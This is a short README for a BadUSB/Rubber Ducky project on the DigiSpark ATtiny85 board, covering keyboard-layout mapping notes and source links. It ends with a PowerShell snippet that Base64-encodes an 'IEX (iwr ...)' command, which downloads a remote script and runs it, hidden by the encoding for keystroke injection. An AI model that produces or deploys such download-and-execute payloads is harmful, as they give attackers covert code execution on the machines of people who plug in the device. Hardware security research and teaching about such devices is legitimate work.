<h1>Bad USB</h1>
<p>This directory is for files directed to creating a BadUSB or RubberDucky.<br>
The scripts are written for the DigiSpark Attiny85 USB mini Arduino board.<br>
Code is added with the Arduino IDE.</p>


<h2>Info:</h2> 
<p>The USB writes directly to the keyboard, and the default is an American keyboard.<br>
Use this list below to use the equivalent Norwegian keyboard options.<br>
American Keyboard layout info<br><br>
@ = "<br>
- = /<br>
) = (<br>
( = *<br>
/ = &<br>
\ = =<br>
: = ><br>
; = < </p>

<h3>Sources:</h3>
<p>https://digistump.com/wiki/digispark/tutorials/connecting<br>
https://www.secjuice.com/how-to-build-a-low-cost-rubber-ducky/</p>

<h3>Encode Base64 command:<h3>
<p>$String = "IEX (iwr 'https://raw.githubusercontent.com/helfiesp/Security/main/BadUSB/download.ps1')"<br>
$bytes = [System.Text.Encoding]::Unicode.GetBytes($String)<br>
$encodedCommand = [System.Convert]::ToBase64String($bytes)<br>
Write-Host $encodedCommand</p>
